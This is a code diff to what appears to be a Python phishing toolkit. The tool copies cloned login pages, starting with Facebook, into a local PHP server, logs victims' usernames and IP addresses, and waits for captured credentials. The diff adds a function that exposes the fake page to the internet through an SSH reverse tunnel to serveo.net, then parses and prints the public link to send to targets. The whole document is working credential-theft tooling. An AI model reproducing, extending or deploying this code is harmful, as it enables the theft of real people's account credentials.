@@ -60,7 +60,7 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module)
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
+    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
     if option2 == '1' and social == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
@@ -263,21 +263,52 @@ def runPEnv():
         exit(0)
 
 
+    
+def serveo():
+    system('ssh -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
+    sleep(4)
+    f = open('sendlink.txt', 'r')
+    a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
+    lst = []
+    for line in f:
+    	for word in a:
+            if word in line:
+            	line = line.replace(word,'')	    	
+    	lst.append(line)
+    f.close()
+    f = open('sendlink.txt','w')
+    for line in lst:
+    	f.write(line)
+    f.close()
+    url = open('sendlink.txt', 'r')    
+    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
+    url.close()
+    system('rm sendlink.txt')    
+
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:1111")
+
+    system("cd Server/www/ && php -n -S 127.0.0.1:1111 > /dev/null 2>&1 &")
+
+    
+
 
 
 
 if __name__ == "__main__":
     try:
-        runPEnv()        
+        runPEnv()
+        serveo() 
         multiprocessing.Process(target=runServer).start()
         waitCreds()
 
 
 
 
+
+           
+
     except KeyboardInterrupt:        
+        system('pkill -f ssh')
         end()
         exit(0)
